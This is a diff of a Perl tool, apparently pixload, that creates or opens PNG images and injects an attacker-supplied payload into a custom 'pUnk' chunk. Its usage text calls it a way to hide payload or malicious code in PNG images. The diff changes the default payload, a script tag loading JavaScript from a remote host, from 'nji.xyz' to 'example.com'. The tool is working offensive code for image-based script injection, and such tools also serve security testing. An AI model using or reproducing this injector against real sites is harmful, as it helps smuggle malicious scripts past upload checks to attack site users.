@@ -16,39 +16,23 @@ use feature  'say';
 
 use POSIX;
 use Getopt::Long;
+use File::Basename;
+
+use constant PROGRAM => basename $0;
+use constant VERSION => 0.2;
+
 use GD;
 use String::CRC32;
 
-sub systell;
-sub rewind;
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                             Default Options                                 #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
-sub usage;
-sub create_png;
-sub inject_payload;
-
-# Command line options
-GetOptions(
-    'help!'     =>  \my $help,
-    'payload=s' =>  \my $payload,
-    'output=s'  =>  \my $outfile,
+my %opts = (
+    pixelwidth      =>  32,
+    pixelheight     =>  32,
+    payload         =>  '<script src=//example.com></script>',
 );
-usage(0)     if $help;
-usage(1) unless $outfile;
-
-$payload //= '<script src=//nji.xyz></script>';
-
-say <<EOF;
-[>|      PNG Payload Creator/Injector       |<]
-
-    https://github.com/chinarulezzz/pixload
-
-EOF
-
-create_png              unless -f $outfile;
-inject_payload;
-
-say `file       $outfile`   if -f '/usr/bin/file';
-say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                Subroutines                                  #
@@ -62,40 +46,31 @@ sub rewind {
     sysseek $_[0], systell($_[0]) - $_[1], SEEK_CUR
 }
 
-sub usage {
-    say <<"EOF";
-Usage: $0 [-payload 'STRING'] -output payload.png
-
-If the output file exists, then the payload will be injected into the
-existing file.  Else the new one will be created.
-EOF
-    exit +shift;
-}
-
 sub create_png {
     say "[>] Generating output file";
 
     my $img = GD::Image->new(
-        32,
-        32,
-         1, # Set 1 to TrueColor (24 bits of color data), default is 8-bit palette
+        $opts{pixelwidth},
+        $opts{pixelheight},
+        # set 1 to TrueColor (24 bits of color data), default is 8-bit palette
+        1,
     );
 
     my $color = $img->colorAllocate(0, 0, 0);
 
     $img->setPixel(0, 0, $color);
 
-    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
+    sysopen my $fh, $opts{FILE}, O_CREAT|O_WRONLY;
     syswrite   $fh, $img->png;
     close      $fh;
 
-    say "[✔] File saved to: $outfile\n";
+    say "[✔] File saved to: $opts{FILE}\n";
 }
 
 sub inject_payload {
-    say "[>] Injecting payload into $outfile\n";
+    say "[>] Injecting payload into $opts{FILE}\n";
 
-    sysopen our $fh, $outfile, O_RDWR;
+    sysopen our $fh, $opts{FILE}, O_RDWR;
 
     # check if outfile is PNG to prevent infinite loop
     {
@@ -103,7 +78,7 @@ sub inject_payload {
         sysseek     $fh, 1, SEEK_SET;
         sysread     $fh, $format, 3;
 
-        die "ERROR: $outfile is not a PNG file.\n"
+        die "ERROR: $opts{FILE} is not a PNG file.\n"
             if $format ne "PNG";
     }
 
@@ -138,14 +113,14 @@ sub inject_payload {
     say "\n[>] Inject payload to the new chunk: 'pUnk'";
 
     # chunk size
-    syswrite $fh, (pack 'I>', length $payload);
+    syswrite $fh, (pack 'I>', length $opts{payload});
 
     # chunk name: PUnK (critical)
     syswrite $fh, "\x50\x55\x6e\x4b";
 
-    syswrite $fh, $payload;
+    syswrite $fh, $opts{payload};
 
-    syswrite $fh, (pack 'I>', crc32('IEND' . $payload));
+    syswrite $fh, (pack 'I>', crc32('IEND' . $opts{payload}));
 
     syswrite $fh, "\x00IEND";
 
@@ -153,6 +128,62 @@ sub inject_payload {
 
     say "[✔] Payload was injected successfully\n";
 }
+
+sub banner {
+    <<EOF;
+[>|      PNG Payload Creator/Injector       |<]
+
+    https://github.com/chinarulezzz/pixload
+EOF
+}
+
+sub usage {
+    <<"EOF";
+Usage: @{[ PROGRAM ]} [OPTION]... FILE
+Hide Payload/Malicious Code in PNG Images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -W, --pixelwidth  INTEGER   set pixel width for the new image (default: 32)
+  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
+  -P, --payload STRING        set payload for injection
+  -v, --version               print version and exit
+  -h, --help                  print help and exit
+
+If the output FILE already exists, then payload will be injected into this
+existing file. Else, the new one will be created with specified pixels wide.
+EOF
+}
+
+sub version {
+    PROGRAM . " " . VERSION . " ";
+}
+
+sub main {
+    # command line options
+    GetOptions(
+        'h|help!'         =>  \$opts{help},
+        'v|version!'      =>  \$opts{version},
+        'P|payload=s'     =>  \$opts{payload},
+        'W|pixelwidth=i'  =>  \$opts{pixelwidth},
+        'H|pixelheight=i' =>  \$opts{pixelheight},
+    ) or die "$!\n";
+
+    $opts{FILE} = shift @ARGV;
+
+    say &usage    and  exit(0)  if   $opts{help};
+    say &version  and  exit(0)  if   $opts{version};
+    say &usage    and  exit(1)  if ! $opts{FILE};
+
+    say &banner;
+
+    &create_png if ! -f $opts{FILE};
+    &inject_payload;
+
+    say `file        $opts{FILE}` if -f '/usr/bin/file';
+    say `hexdump -C  $opts{FILE}` if -f '/usr/bin/hexdump';
+}
+
+main;
 
 # vim:sw=4:ts=4:sts=4:et:cc=80
 # End of file
